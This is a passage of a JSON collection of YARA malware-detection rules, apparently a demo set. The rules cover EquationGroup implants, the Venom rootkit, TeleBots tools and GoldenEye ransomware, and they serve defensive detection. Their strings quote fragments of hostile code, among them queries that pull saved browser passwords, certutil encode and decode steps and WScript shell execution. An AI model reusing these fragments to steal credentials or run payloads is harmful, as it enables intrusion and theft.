wide\n      $s2 = \"ntfltmgr.pdb\" fullword ascii\n      $s4 = \"Network Filter Manager\" fullword wide\n      $s5 = \"Corporation. All rights reserved.\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-01-13 12:29:21","description":"EquationGroup Malware - file ntfltmgr.sys","minimum_yara":"1.7","name":"EquationGroup_ntfltmgr_RID3031","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"4d9fcc64eb8bce01014fac4a3d41a40e","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_DXGHLP16_RID2EF1 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file DXGHLP16.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 11:36:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"DXGHLP16.SYS\" fullword wide\n      $s2 = \"P16.SYS\" fullword ascii\n      $s3 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n      $s4 = \"\\\\DosDevices\\\\%ws\" fullword wide\n      $s5 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n      $s6 = \"ct@SYS\\\\DXGHLP16.dbg\" fullword ascii\n      $s7 = \"%ws%03d%ws%wZ\" fullword wide\n      $s8 = \"TCP/IP driver\" fullword wide\n      $s9 = \"\\\\Device\\\\%ws\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-01-13 11:36:01","description":"EquationGroup Malware - file DXGHLP16.SYS","minimum_yara":"1.7","name":"EquationGroup_DXGHLP16_RID2EF1","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"2f8e939ac5fb828509fc037131db5310","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_RunAsChild_Lp_RID31AB : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file RunAsChild_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 13:32:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Privilege elevation failed\" fullword wide\n      $s2 = \"Unable to open parent process\" fullword wide\n      $s4 = \"Invalid input to lpRunAsChildPPC\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-01-13 13:32:21","description":"EquationGroup Malware - file RunAsChild_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_RunAsChild_Lp_RID31AB","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"90ca59ed086ff6312b046ee9c657e20f","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_EquationDrug_Gen_6_RID33A9 : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level3_dll_x64\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Psxssdll.dll\" fullword wide\n      $s2 = \"Posix Server Dll\" fullword wide\n      $s3 = \"Copyright (C) Microsoft\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-01-13 14:57:21","description":"EquationGroup Malware - file PC_Level3_dll_x64","minimum_yara":"1.7","name":"EquationGroup_EquationDrug_Gen_6_RID33A9","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"0946a5f7c97639c69f9a0973e6c506a3","score":75,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule EquationGroup_PC_Level3_http_flav_dll_x64_RID36E3 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file PC_Level3_http_flav_dll_x64\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 17:15:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Psxssdll.dll\" fullword wide\n      $s2 = \"Posix Server Dll\" fullword wide\n      $s3 = \".?AVOpenSocket@@\" fullword ascii\n      $s4 = \"RHTTP/1.0\" fullword wide\n      $s5 = \"Copyright (C) Microsoft\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( all of ( $s* ) ) ) or ( all of them )\n}","date":"2017-01-13 17:15:01","description":"EquationGroup Malware - file PC_Level3_http_flav_dll_x64","minimum_yara":"1.7","name":"EquationGroup_PC_Level3_http_flav_dll_x64_RID36E3","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"c04c069fa6c5a082690130775d2d8069","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_EquationDrug_Gen_3_RID33A6 : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"EquationGroup Malware - file mssld.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:56:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } \n      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } \n      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2017-01-13 14:56:51","description":"EquationGroup Malware - file mssld.dll","minimum_yara":"1.7","name":"EquationGroup_EquationDrug_Gen_3_RID33A6","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"60aed6f3ce8b1cc411db52b091c07057","score":75,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule EquationGroup_ModifyGroup_Lp_RID3253 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file ModifyGroup_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Modify Privileges failed\" fullword wide\n      $s2 = \"Given privilege name not found\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-01-13 14:00:21","description":"EquationGroup Malware - file ModifyGroup_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_ModifyGroup_Lp_RID3253","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"1337de2e9b413582841b5340efa67e93","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_EventLogEdit_Implant_RID34A1 : APT DEMO EXE FILE MAL T1050 {\n   meta:\n      description = \"EquationGroup Malware - file EventLogEdit_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 15:38:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\EventLog\\\\%ls\" fullword wide\n      $s2 = \"Ntdll.dll\" fullword ascii\n      $s3 = \"hZwOpenProcess\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-01-13 15:38:41","description":"EquationGroup Malware - file EventLogEdit_Implant.dll","minimum_yara":"1.7","name":"EquationGroup_EventLogEdit_Implant_RID34A1","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"2c2be8d2c37df69084c38b7a4234e9c2","score":75,"tags":["T1050","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule EquationGroup_PortMap_Lp_RID30A1 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file PortMap_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 12:48:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Privilege elevation failed\" fullword wide\n      $s2 = \"Portmap ended due to max number of ports\" fullword wide\n      $s3 = \"Invalid parameters received for portmap\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them )\n}","date":"2017-01-13 12:48:01","description":"EquationGroup Malware - file PortMap_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_PortMap_Lp_RID30A1","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"c8c90b7ac023165d4d7b6ab441ad250b","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_PassFreely_Lp_RID31DC : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"EquationGroup Malware - file PassFreely_Lp.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 13:40:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Unexpected value in memory.  Run the 'CheckOracle' or 'memcheck' command to identify the problem\" fullword wide\n      $s2 = \"Oracle process memory successfully modified!\" fullword wide\n      $s3 = \"Unable to reset the memory protection mask to the memory\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}","date":"2017-01-13 13:40:31","description":"EquationGroup Malware - file PassFreely_Lp.dll","minimum_yara":"1.7","name":"EquationGroup_PassFreely_Lp_RID31DC","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"9cbf27185f325ae41f5d60bb37bdbbfc","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EquationGroup_EquationDrug_Gen_1_RID33A4 : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"EquationGroup Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tcSoiJ\"\n      date = \"2017-01-13 14:56:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Injection Lib -  GetProcAddress failed on Kernel32.DLL function\" fullword wide\n      $x2 = \"Injection Lib -  JUMPUP failed to open requested process\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) ) or ( all of them )\n}","date":"2017-01-13 14:56:31","description":"EquationGroup Malware","minimum_yara":"1.7","name":"EquationGroup_EquationDrug_Gen_1_RID33A4","reference":"https://goo.gl/tcSoiJ","required_modules":[],"rule_hash":"c99fff6bebdf39c960e3850170f62a57","score":75,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule Venom_Rootkit_RID2C61 : APT DEMO LINUX MAL T1014 {\n   meta:\n      description = \"Venom Linux Rootkit\"\n      author = \"Florian Roth\"\n      reference = \"https://security.web.cern.ch/security/venom.shtml\"\n      date = \"2017-01-12 09:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, LINUX, MAL, T1014\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%%VENOM%CTRL%MODE%%\" ascii fullword\n      $s2 = \"%%VENOM%OK%OK%%\" ascii fullword\n      $s3 = \"%%VENOM%WIN%WN%%\" ascii fullword\n      $s4 = \"%%VENOM%AUTHENTICATE%%\" ascii fullword\n      $s5 = \". entering interactive shell\" ascii fullword\n      $s6 = \". processing ltun request\" ascii fullword\n      $s7 = \". processing rtun request\" ascii fullword\n      $s8 = \". processing get request\" ascii fullword\n      $s9 = \". processing put request\" ascii fullword\n      $s10 = \"venom by mouzone\" ascii fullword\n      $s11 = \"justCANTbeSTOPPED\" ascii fullword\n   condition: \n      filesize < 4000KB and 2 of them\n}","date":"2017-01-12 09:46:41","description":"Venom Linux Rootkit","minimum_yara":"1.7","name":"Venom_Rootkit_RID2C61","reference":"https://security.web.cern.ch/security/venom.shtml","required_modules":[],"rule_hash":"cb0709e616a18f2ab1143873246e5ed4","score":75,"tags":["APT","DEMO","LINUX","T1014","MAL"]},{"author":"Florian Roth","content":"rule GRIZZLY_STEPPE_Malware_1_RID2F34 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Semiautomatic generated rule - file HRDG022184_certclint.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/WVflzO\"\n      date = \"2016-12-29 11:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"S:\\\\Lidstone\\\\renewing\\\\HA\\\\disable\\\\In.pdb\" fullword ascii\n      $s2 = \"Repeat last find command)Replace specific text with different text\" fullword wide\n      $s3 = \"l\\\\Processor(0)\\\\% Processor Time\" fullword wide\n      $s6 = \"Self Process\" fullword wide\n      $s7 = \"Default Process\" fullword wide\n      $s8 = \"Star Polk.exe\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 4 of them )\n}","date":"2016-12-29 11:47:11","description":"Semiautomatic generated rule - file HRDG022184_certclint.dll","minimum_yara":"1.7","name":"GRIZZLY_STEPPE_Malware_1_RID2F34","reference":"https://goo.gl/WVflzO","required_modules":[],"rule_hash":"f4f0db65da77fd9d1a819766cc6a843c","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule GRIZZLY_STEPPE_Malware_2_RID2F35 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Semiautomatic generated rule - file 9acba7e5f972cdd722541a23ff314ea81ac35d5c0c758eb708fb6e2cc4f598a0\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/WVflzO\"\n      date = \"2016-12-29 11:47:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"GoogleCrashReport.dll\" fullword ascii\n      $s1 = \"CrashErrors\" fullword ascii\n      $s2 = \"CrashSend\" fullword ascii\n      $s3 = \"CrashAddData\" fullword ascii\n      $s4 = \"CrashCleanup\" fullword ascii\n      $s5 = \"CrashInit\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and $x1 ) or ( all of them )\n}","date":"2016-12-29 11:47:21","description":"Semiautomatic generated rule - file 9acba7e5f972cdd722541a23ff314ea81ac35d5c0c758eb708fb6e2cc4f598a0","minimum_yara":"1.7","name":"GRIZZLY_STEPPE_Malware_2_RID2F35","reference":"https://goo.gl/WVflzO","required_modules":[],"rule_hash":"c74d22aeb75463df1ab8c4ca4df543ce","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule TeleBots_KillDisk_2_RID2E3A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects TeleBots malware - KillDisk\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4if3HG\"\n      date = \"2016-12-14 11:05:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Plug-And-Play Support Service\" fullword wide\n      $s2 = \" /c \\\"echo Y|\" fullword wide\n      $s3 = \"%d.%d.%d#%d:%d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )\n}","date":"2016-12-14 11:05:31","description":"Detects TeleBots malware - KillDisk","minimum_yara":"1.7","name":"TeleBots_KillDisk_2_RID2E3A","reference":"https://goo.gl/4if3HG","required_modules":[],"rule_hash":"619e060c8196d5dd9df2b7f471cc393f","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule TeleBots_IntercepterNG_RID2FAC : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects TeleBots malware - IntercepterNG\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4if3HG\"\n      date = \"2016-12-14 12:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: %s iface_num\\\\dump [mode] [w] [-gw] [-t1 ip]\" fullword ascii\n      $s2 = \"Target%d found: %s - [%.2X-%.2X-%.2X-%.2X-%.2X-%.2X]\" fullword ascii\n      $s3 = \"3: passwords + files, no arp poison\" fullword ascii\n      $s4 = \"IRC Joining Keyed Channel intercepted\" fullword ascii\n      $s5 = \"-tX - set target ip\" fullword ascii\n      $s6 = \"w - save session to .pcap dump\" fullword ascii\n      $s7 = \"example: %s 1 1 -gw 192.168.1.1 -t1 192.168.1.3 -t2 192.168.1.5\" fullword ascii\n      $s8 = \"ORACLE8 DES Authorization intercepted\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 4 of them )\n}","date":"2016-12-14 12:07:11","description":"Detects TeleBots malware - IntercepterNG","minimum_yara":"1.7","name":"TeleBots_IntercepterNG_RID2FAC","reference":"https://goo.gl/4if3HG","required_modules":[],"rule_hash":"a6ae30b0672398537e60091e180d3621","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule TeleBots_KillDisk_1_RID2E39 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects TeleBots malware - KillDisk\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4if3HG\"\n      date = \"2016-12-14 11:05:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Plug-And-Play Support Service\" fullword wide\n      $s2 = \" /c \\\"echo Y|\" fullword wide\n      $s3 = \"-set=06.12.2016#09:30 -est=1410\" fullword ascii\n      $s4 = \"%d.%d.%d#%d:%d\" fullword ascii\n      $s5 = \" /T /C /G \" fullword wide\n      $s6 = \"[-] > %ls\" fullword wide\n      $s7 = \"[+] > %ls\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them ) or ( 6 of them )\n}","date":"2016-12-14 11:05:21","description":"Detects TeleBots malware - KillDisk","minimum_yara":"1.7","name":"TeleBots_KillDisk_1_RID2E39","reference":"https://goo.gl/4if3HG","required_modules":[],"rule_hash":"3c684760edcaed20657a8528fb09c608","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule TeleBots_CredRaptor_Password_Stealer_RID3569 : APT DEMO EXE FILE MAL T1003 {\n   meta:\n      description = \"Detects TeleBots malware - CredRaptor Password Stealer\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4if3HG\"\n      date = \"2016-12-14 16:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Documents and Settings\\\\Administrator\\\\Desktop\\\\GetPAI\\\\Out\\\\IE.pdb\" fullword ascii\n      $s2 = \"SELECT encryptedUsername, encryptedPassword, hostname,httpRealm FROM moz_logins\" fullword ascii\n      $s3 = \"SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS\" fullword ascii\n      $s4 = \".\\\\PAI\\\\IEforXPpasswords.txt\" fullword ascii\n      $s5 = \"\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n      $s6 = \"Opera old version credentials\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them ) or ( 4 of them )\n}","date":"2016-12-14 16:12:01","description":"Detects TeleBots malware - CredRaptor Password Stealer","minimum_yara":"1.7","name":"TeleBots_CredRaptor_Password_Stealer_RID3569","reference":"https://goo.gl/4if3HG","required_modules":[],"rule_hash":"7a9a731281c8b7b94f4ace05862302b6","score":75,"tags":["MAL","DEMO","T1003","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule TeleBots_VBS_Backdoor_1_RID2F91 : APT DEMO FILE MAL SCRIPT {\n   meta:\n      description = \"Detects TeleBots malware - VBS Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4if3HG\"\n      date = \"2016-12-14 12:02:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd = \\\"cmd.exe /c \\\" + arg + \\\" >\\\" + outfile +\\\" 2>&1\\\"\" fullword ascii\n      $s2 = \"GetTemp = \\\"c:\\\\WINDOWS\\\\addins\\\"\" fullword ascii\n      $s3 = \"elseif (arg0 = \\\"-dump\\\") Then\" fullword ascii\n      $s4 = \"decode = \\\"certutil -decode \\\" + source + \\\" \\\" + dest  \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6553 and filesize < 8KB and 1 of them ) or ( all of them )\n}","date":"2016-12-14 12:02:41","description":"Detects TeleBots malware - VBS Backdoor","minimum_yara":"1.7","name":"TeleBots_VBS_Backdoor_1_RID2F91","reference":"https://goo.gl/4if3HG","required_modules":[],"rule_hash":"bace9bddef25c42c1aeb80d628bbd7e5","score":75,"tags":["APT","DEMO","SCRIPT","FILE","MAL"]},{"author":"Florian Roth","content":"rule TeleBots_VBS_Backdoor_2_RID2F92 : APT DEMO FILE MAL SCRIPT {\n   meta:\n      description = \"Detects TeleBots malware - VBS Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4if3HG\"\n      date = \"2016-12-14 12:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd = \\\"cmd.exe /c \\\" + arg + \\\" \\\" + arg2\" fullword ascii\n      $s2 = \"Dim WMI:  Set WMI = GetObject(\\\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2\\\")\" fullword ascii\n      $s3 = \"cmd = \\\"certutil -encode -f \\\" + source + \\\" \\\" + dest\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6944 and filesize < 30KB and 1 of them ) or ( 2 of them )\n}","date":"2016-12-14 12:02:51","description":"Detects TeleBots malware - VBS Backdoor","minimum_yara":"1.7","name":"TeleBots_VBS_Backdoor_2_RID2F92","reference":"https://goo.gl/4if3HG","required_modules":[],"rule_hash":"b259c8d9a0c75a655c4dc4ff5be098bf","score":75,"tags":["APT","DEMO","SCRIPT","FILE","MAL"]},{"author":"Florian Roth","content":"rule TeleBots_Win64_Spy_KeyLogger_G_RID3253 : APT DEMO EXE FILE T1056 {\n   meta:\n      description = \"Detects TeleBots malware - Win64 Spy KeyLogger G\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4if3HG\"\n      date = \"2016-12-14 14:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1056\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\WRK\\\\GHook\\\\gHook\\\\x64\\\\Debug\\\\gHookx64.pdb\" fullword ascii\n      $s2 = \"Install hooks error!\" fullword wide\n      $s4 = \"%ls%d.~tmp\" fullword wide\n      $s5 = \"[*]Window PID > %d: \" fullword wide\n      $s6 = \"Install hooks ok!\" fullword wide\n      $s7 = \"[!]Clipboard paste\" fullword wide\n      $s9 = \"[*] IMAGE : %ls\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them ) or ( 3 of them )\n}","date":"2016-12-14 14:00:21","description":"Detects TeleBots malware - Win64 Spy KeyLogger G","minimum_yara":"1.7","name":"TeleBots_Win64_Spy_KeyLogger_G_RID3253","reference":"https://goo.gl/4if3HG","required_modules":[],"rule_hash":"5416c337442a31256d14b5c624a4c1a5","score":75,"tags":["APT","DEMO","EXE","FILE","T1056"]},{"author":"Florian Roth","content":"rule GoldenEyeRansomware_Dropper_MalformedZoomit_RID385F : DEMO EXE FILE MAL {\n   meta:\n      description = \"Dropped Executable - \"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/jp2SkT\"\n      date = \"2016-12-06 18:18:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ZoomIt - Sysinternals: www.sysinternals.com\" fullword ascii\n      $n1 = \"Mark Russinovich\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and $s1 and not $n1 )\n}","date":"2016-12-06 18:18:21","description":"Dropped Executable - ","minimum_yara":"1.7","name":"GoldenEyeRansomware_Dropper_MalformedZoomit_RID385F","reference":"https://goo.gl/jp2SkT","required_modules":[],"rule_hash":"7c942ab313a74d59c472cc86e6db54c7","score":60,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule GoldenEye_Ransomware_XLS_RID3061 : CRIME DEMO FILE MAL T1193 T1203 {\n   meta:\n      description = \"GoldenEye XLS with Macro - file Schneider-Bewerbung.xls\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/jp2SkT\"\n      date = \"2016-12-06 12:37:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, FILE, MAL, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"fso.GetTempName();tmp_path = tmp_path.replace('.tmp', '.exe')\" fullword ascii\n      $x2 = \"var shell = new ActiveXObject('WScript.Shell');shell.run(t'\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 4000KB and 1 of them )\n}","date":"2016-12-06 12:37:21","description":"GoldenEye XLS with Macro - file Schneider-Bewerbung.xls","minimum_yara":"1.7","name":"GoldenEye_Ransomware_XLS_RID3061","reference":"https://goo.gl/jp2SkT","required_modules":[],"rule_hash":"e12efdbae3c6da55c99c468d25712a08","score":60,"tags":["T1203","T1193","MAL","DEMO","FILE","CRIME"]},{"author":"Florian Roth","content":"rule SysInternals_Tool_Anomaly_RID312D : ANOMALY DEMO EXE FILE {\n   meta:\n      description = \"SysInternals Tool Anomaly - does not contain Mark Russinovich as author\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-12-06 13:11:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"ANOMALY, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = 